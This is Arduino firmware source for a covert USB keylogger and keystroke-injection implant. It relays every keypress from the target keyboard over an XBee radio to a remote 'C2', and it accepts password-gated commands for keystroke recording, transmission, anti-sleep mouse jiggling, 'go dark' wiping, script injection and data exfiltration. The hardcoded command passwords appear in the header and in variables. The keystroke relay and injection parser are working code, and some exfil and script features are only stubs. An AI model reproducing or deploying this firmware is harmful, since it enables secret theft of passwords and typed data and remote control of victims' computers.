/*
 * Receive ASCII text from Serial1 and convert to USB HID report.
 * Send HID report out USB interface.
 * Maps out keystrokes and sends out data over ble when a central device is connected
 * Code is being brought together to eliminate BLE functionality and read it in over
 * serial from the xbee instead
 * Using Serial 1 for now as interface with Xbee. This may change in the future
 * Update on 4/9/21 by Jonathan Fischer
 * 
 * ---passwords---
 * Activate: fOci0a25-x#p-u3?
 * Get Modes: YLwuhlTHEh1q7Ha!
 * Enable Tx Keystrokes: ce8hovfvemu@ap*B+H3s
 * Disable Tx Keystrokes: ce8hovevemu@ap*B+H3s
 * Enable Insomnia: jorLwabocUqeq6bRof$2
 * Disable Insomnia: jorLwbbocUqeq6bRof$2
 * Enable Keystroke Recorder: GatIQEMaNodE5L#p$T?l
 * Disable Keystroke Recorder: GatlQEMaNodE5L#p$T?l
 * Wipe SD Card/Stop Comm (Go Dark): 4+aJu2+6ATRES+ef_OtR
 * Launch Attack from Script: c01h2*+dIp?W3lpez*T=
 * Exfil Data File: 
 * Rx Attack Script: Jas?8jl2i2=p!aw#
 */

#define PAD_SERIAL2_TX       (UART_TX_PAD_0)      
#define PAD_SERIAL2_RX       (SERCOM_RX_PAD_1)   
#define ALT_SERCOM         sercom0
#define ALT_SERCOM_TX     4        // SERCOM0, PAD0
#define ALT_SERCOM_RX     5        // SERCOM0, PAD1

Uart Serial2(&sercom2, ALT_SERCOM_RX, ALT_SERCOM_TX, PAD_SERIAL2_RX, PAD_SERIAL2_TX);

#include <Keyboard.h>
#include <Mouse.h>


//password variables
String activatePW = "fOci0a25-x#p-u3?";
String getModesPW = "YLwuhlTHEh1q7Ha!";
String recKeysEnablePW = "GatIQEMaNodE5L#p$T?l";
String recKeysDisablePW = "GatlQEMaNodE5L#p$T?l";
String txKeysPW = "ce8hovfvemu@ap*B+H3s";
String disableKeyTxPW = "ce8hovevemu@ap*B+H3s";
String insomniaPW = "jorLwabocUqeq6bRof$2";
String allowSleepPW = "jorLwbbocUqeq6bRof$2";
String goDarkPW = "4+aJu2+6ATRES+ef_OtR";
String injectPW = "c01h2*+dIp?W3lpez*T=";
String exfilPW = "exfil";
String rxScriptPW = "Jas?8jl2i2=p!aw#";

//Toggle variables
bool activate = false; //allow outgoing communication with C2
bool txKeys = false;
bool insomnia = false;
bool record = false;
bool keyinject = false;
bool exfil = false;
bool rxScript = false;
bool fileName = false;
bool info = false;
String incoming = "";


char aLine[81];
uint8_t aLine_count = 0;

#if 0
/* Arduino Zero */
#define SERDEBUG  Serial1
#define USBEvent  Serial
#endif

#if 1
/* Trinket M0 or 32u4 */
#define SERDEBUG  Serial
#define USBEvent  Serial1
#endif




void setup()
{
#ifdef SERDEBUG
  SERDEBUG.begin(9600);
  Serial2.begin(9600);
#endif
  USBEvent.begin(9600);
  Serial2.begin(9600);
  aLine_count = 0;
}

uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
{
  char *p;
  uint8_t outbuf_count = 0;

  memset(outbuf, 0, outbuf_len);
  p = strtok(buf, ",");
  while (p != NULL && outbuf_count < outbuf_len) {
    *outbuf++ = strtoul(p, NULL, 10);
    outbuf_count++;
    p = strtok(NULL, ",");
  }
  return outbuf_count;
}


void loop() {  

  
#ifdef SERDEBUG
  if (SERDEBUG.available() > 0) {
    char c = SERDEBUG.read();
    USBEvent.write(c);
  }
#endif

  if (USBEvent.available() > 0) {
    char c = USBEvent.read();
#ifdef SERDEBUG
    SERDEBUG.print("c 0x"); SERDEBUG.println(c, HEX);
#endif
    if (c == '\n' || aLine_count >= sizeof(aLine)) {
      aLine[aLine_count] = '\0';
#ifdef SERDEBUG
      SERDEBUG.println(aLine);
#endif
      char command = aLine[0];
      uint8_t rawdata[8];
      uint8_t raw_len = params2bin(aLine+2, rawdata, sizeof(rawdata));
      aLine_count = 0;
      String message = "";
      if (raw_len > 0) {
        switch (command) {
          // Keyboard HID report
          case 'K':
          case 'k':
            if (raw_len != 8) break;
            if (rawdata[0] != 0) {
              message.concat(getMod(byte(rawdata[0])));
            }
            for (byte i = 2; i < raw_len; i++){
              if (message.length() > 0){
                message.concat(" ");
              }
              message.concat(getKey(byte(rawdata[i])));
            }
            Serial.print("Key press: ");
            Serial2.println(message);
            char keyArray[20];
            message.toCharArray(keyArray,20);

            HID().SendReport(2, rawdata, sizeof(KeyReport));
            break;
            // Mouse HID report
          case 'M':
          case 'm':
            if (raw_len != 4) break;
            HID().SendReport(1, rawdata, 4);
            break;
            // Joystick????
          case 'J':
          case 'j':
            break;
          default:
            break;
        }
      }
    }
    else {
      aLine[aLine_count++] = c;
    }
  }

  
  //rx incoming from xbee
  if (Serial2.available()) {
    incoming = Serial2.readString();
    Serial2.println(incoming);
    if (activate) {
      //only allow functionality if activated by C2
      setMode(incoming);
    } else if (incoming == activatePW) {
      activate = true;
      Serial2.println("Activate is set true");
    }
  }

  if (insomnia) {
    Mouse.move(1, 0);
    Mouse.move(-1,0);
    Mouse.end();
  }
}

void setMode(String pass){
  if (keyinject == true) {
    Serial2.println("Key Inject is set to true");
    Serial2.print("File name is: ");
    Serial2.println(pass);
    keyinject = false;
    //launchScript(incoming); 
  }else if (exfil == true){
    Serial2.println("Exfil is set to true");
    //exfilFunction(incoming);
    exfil = false;
  }else if (rxScript == true){
    Serial2.println("Receive script is set to true");
    //rxScriptWrite(incoming);
    rxScript = false;
  }
  else if (pass == getModesPW) {
    Serial2.println("IM HERE!!");
    getModes();
  }else if (pass == recKeysEnablePW){
    Serial2.println("Record Keys Enabled");
    record = true;
  }else if (pass == recKeysDisablePW){
    Serial2.println("Record Keys Disabled");
    record = false;
  }else if (pass == txKeysPW){
    Serial2.println("Transmit Keys Enabled");
    txKeys = true;
  }else if (pass == disableKeyTxPW){
    Serial2.println("Transmit Keys Disabled");
    txKeys = false;
  }else if (pass == insomniaPW){
    Serial2.println("Insomnia Enabled");
    insomnia = true;
  }else if (pass == allowSleepPW){
    Serial2.println("Insomnia Disabled");
    insomnia = false;
  }else if (pass == goDarkPW){
    Serial2.println("Wipe card and go into dark mode");
    activate = false;
    txKeys = false;
    record = false;
    insomnia = false;
  }else if (pass == injectPW){
    Serial2.println("Inject keystrokes enabled");
    //File root = SD.open("/");
    //String rootDir = "/Scripts/";
    //printScripts(root, rootDir);
    keyinject = true;
  }else if (pass == exfilPW){
    Serial2.println("Exfil data enabled");
    exfil = true;
  }else if (pass == rxScriptPW){
    Serial2.println("Receive Script enabled");
    rxScript = true;
  } 
}


void inject(String s){
  Keyboard.begin();
  int len = s.length();
  String command = s.substring(3,len);
  if (s.startsWith("ps")){
    //indicates Keyboard.press()
      String cCommand = s.substring(3,len); 
      Keyboard.press(mapChars(command));
  }
  else if(s.startsWith("pt")){
  //indicates keyboard.print()
    Keyboard.print(command);
  } 
  else if(s.startsWith("r")){
    Keyboard.releaseAll();
  } 
  else if (s.startsWith("d")){
    delay(command.toInt());
  }
  else {
    Serial2.println("There was an error with the script parsing.");
    Serial2.println("Exiting Attack script.");
    return;
  }
  return;
}

void getModes(){
  if (record){
    Serial2.println("Key recorder mode active");
    Serial2.println("Key recorder mode active");
  } else {
    Serial2.println("Key recorder mode deactivated");
    Serial2.println("Key recorder mode deactivated");
  }

  if (insomnia){
    Serial2.println("Insomnia mode active");
    Serial2.println("Insomnia mode active");
  } else{
    Serial2.println("Insomnia mode deactived");
    Serial2.println("Insomnia mode deactived");
  }
  Serial2.flush();
  delay(100);
  Serial2.println("<<<End of Message>>>");
}

String getMod (byte m){
  String output = "";
  if (m > 64){
    output.concat("RtAlt ");
    m = m - 64;
  }
  else if (m == 64){
    output.concat("RAlt");
    m = m - 64;
  }
  if (m > 32){
    output.concat("RtShft ");
    m = m - 32;
  }
  else if (m == 32) {
    output.concat("RtShft");
    m = m - 32;
  }
  if (m > 16) {
    output.concat("RtCtrl ");
    m = m - 16;
  }
  else if (m == 16){
    output.concat("RtCtrl");
    m = m - 16;
  }
  if (m > 8) {
    output.concat("LtGUI ");
    m = m - 8;
  }
  else if (m == 8) {
    output.concat("LtGUI");
    m = m - 8;
  }
  if (m > 4) {
    output.concat("LtAlt ");
    m = m - 4;
  }
  else if (m == 4) {
    output.concat("LtAlt");
    m = m -4;
  }
  if (m > 2) {
    output.concat("LtShft ");
    m = m - 2;
  }
  else if (m == 2) {
    output.concat("LtShft");
    m = m - 2;
  }
  if (m == 1) {
    output.concat("LtCtrl");
  }
  return output;
}

String getKey (byte k){
  switch (k){
    case 0:
      return String("");
    case 1:
      return "Key1NotFound";
    case 2:
      return "Key2NotFound";
    case 3:
      return "Key3NotFound";
    case 4:
      return "a";
    case 5:
      return "b";
    case 6:
      return "c";
    case 7:
      return "d";
    case 8:
      return "e";
    case 9:
      return "f";
    case 10:
      return "g";
    case 11:
      return "h";
    case 12:
      return "i";
    case 13:
      return "j";
    case 14:
      return "k";
    case 15:
      return "l";
    case 16:
      return "m";
    case 17:
      return "n";
    case 18:
      return "o";
    case 19:
      return "p";
    case 20:
      return "q";
    case 21:
      return "r";
    case 22:
      return "s";
    case 23:
      return "t";
    case 24:
      return "u";
    case 25:
      return "v";
    case 26:
      return "w";
    case 27:
      return "x";
    case 28:
      return "y";
    case 29:
      return "z";
    case 30:
      return "1";
    case 31:
      return "2";
    case 32:
      return "3";
    case 33:
      return "4";
    case 34:
      return "5";
    case 35:
      return "6";
    case 36:
      return "7";
    case 37:
      return "8";
    case 38:
      return "9";
    case 39:
      return "0";
    case 40:
      return "Enter";
    case 41:
      return "Esc";
    case 42:
      return "BkSpc";
    case 43:
      return "Tab";
    case 44:
      return "SpcBar";
    case 45:
      return "-";
    case 46:
      return "=";
    case 47:
      return "[";
    case 48:
      return "]";
    case 49:
      return "'\'";
    case 50:
      return "Key50NotMapped";
    case 51:
      return ";";
    case 52:
      return "'";
    case 53:
      return "`";
    case 54:
      return ",";
    case 55:
      return ".";
    case 56:
      return "/";
    case 57:
      return "CapsLck";
    case 58:
      return "F1";
    case 59:
      return "F2";
    case 60:
      return "F3";
    case 61:
      return "F4";
    case 62:
      return "F5";
    case 63:
      return "F6";
    case 64:
      return "F7";
    case 65:
      return "F8";
    case 66:
      return "F9";
    case 67:
      return "F10";
    case 68:
      return "F11";
    case 69:
      return "F12";
    case 70:
      return "PrntScrn";
    case 71:
      return "ScrnLck";
    case 72:
      return "Key72NotMapped";
    case 73:
      return "Ins";
    case 74:
      return "Home";
    case 75:
      return "PgUp";
    case 76:
      return "Del";
    case 77:
      return "End";
    case 78:
      return "PgDn";
    case 79:
      return "ArwR";
    case 80:
      return "ArwL";
    case 81:
      return "ArwD";
    case 82:
      return "ArwU";
    case 83:
      return "NumLck";
    case 84:
      return "Key84NotMapped";
    case 85:
      return "Key85NotMapped";
    case 86:
      return "Key86NotMapped";
    case 87:
      return "Key87NotMapped";
    case 88:
      return "Key88NotMapped";
    case 89:
      return "Key89NotMapped";
    case 90:
      return "Key90NotMapped";
    case 91:
      return "Key91NotFound";
    case 92:
      return "Key92NotFound";
    case 93:
      return "Key93NotFound";
    case 94:
      return "Key94NotFound";
    case 95:
      return "Key95NotFound";
    case 96:
      return "Key96NotFound";
    case 97:
      return "Key97NotFound";
    case 98:
      return "Key98NotFound";
    case 99:
      return "Key99NotFound";
    case 100:
      return "Key100NotFound";
    case 101:
      return "RtGUI";
    default:
      return "KeyNotFound";
      break;
  }
}

char mapChars(String s){
  if (s == "LEFT_CTRL"){
    return 0x80;
  }
  else if (s == "LEFT_SHIFT"){
    return 0x81;
  }
  else if (s == "LEFT_ALT"){
    return 0x82;
  }
  else if (s == "LEFT_GUI"){
    return char(0x83);
  }
  else if (s == "RIGHT_CTRL"){
    return 0x84;
  }
  else if (s == "RIGHT_SHIFT"){
    return 0x85;
  }
  else if (s == "RIGHT_ALT"){
    return 0x86;
  }
  else if (s == "RIGHT_GUI"){
    return 0x87;
  }
  else if (s == "UP_ARROW"){
    return 0xDA;
  }
  else if (s == "DOWN_ARROW"){
    return 0xD9;
  }
  else if (s == "LEFT_ARROW"){
    return 0xD8;
  }
  else if (s == "RIGHT_ARROW"){
    return 0xD7;
  }
  else if (s == "BACKSPACE"){
    return 0xB2;
  }
  else if (s == "TAB"){
    return 0xB3;
  }
  else if (s == "RETURN"){
    return 0xB0;
  }
  else if (s == "ESC"){
    return 0xB1;
  }
  else if (s == "INSERT"){
    return 0xD1;
  }
  else if (s == "DELETE"){
    return 0xD4;
  }
  else if (s == "PAGE_UP"){
    return 0xD3;
  }
  else if (s == "PAGE_DOWN"){
    return 0xD6;
  }
  else if (s == "HOME"){
    return 0xD2;
  }
  else if (s == "END"){
    return 0xD5;
  }
  else if (s == "CAPS_LOCK"){
    return 0xC1;
  }
  else if (s == "F1"){
    return 0xC2;
  }
  else if (s == "F2"){
    return 0xC3;
  }
  else if (s == "F3"){
    return 0xC4;
  }
  else if (s == "F4"){
    return 0xC5;
  }
  else if (s == "F5"){
    return 0xC6;
  }
  else if (s == "F6"){
    return 0xC7;
  }
  else if (s == "F7"){
    return 0xC8;
  }
  else if (s == "F8"){
    return 0xC9;
  }
  else if (s == "F9"){
    return 0xCA;
  }
  else if (s == "F10"){
    return 0xCB;
  }
  else if (s == "F11"){
    return 0xCC;
  }
  else if (s == "F12"){
    return 0xCD;
  }
  else {
    int asize = s.length();
    char out[asize];
    s.toCharArray(out, asize);
    if (asize == 1){
      return out[0];
    } else {
      return 0x00;
    }
  }
}

void SERCOM2_Handler()    // Interrupt handler for SERCOM1
{
  Serial2.IrqHandler();
}
